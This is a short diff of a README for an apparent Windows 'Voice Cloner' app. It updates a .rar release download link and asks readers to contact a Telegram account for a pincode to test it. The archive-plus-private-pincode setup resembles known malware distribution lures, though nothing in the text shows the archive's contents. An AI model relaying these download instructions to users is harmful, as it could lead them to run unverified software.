@@ -58,7 +58,7 @@ Voice Cloner is a tool to clone human voices in a very natural and realistic way
 
 ## Download test the demo application 📥
 
-+ [Download](https://github.com/henszac/Voice-Cloner-Python-Windows/releases/download/1.0/Voice-Cloner-Python-Windows.rar) for Windows (Lastest version 1.0).
++ [Download](https://github.com/henszac/Voice-Cloner-Python-Windows/releases/download/v1.0/Voice-Cloner-Python-Windows.rar) for Windows (Lastest version v1.0).
 
 *Get in touch [here](https://t.me/USERNAME) to get a pincode to test the application.*
 
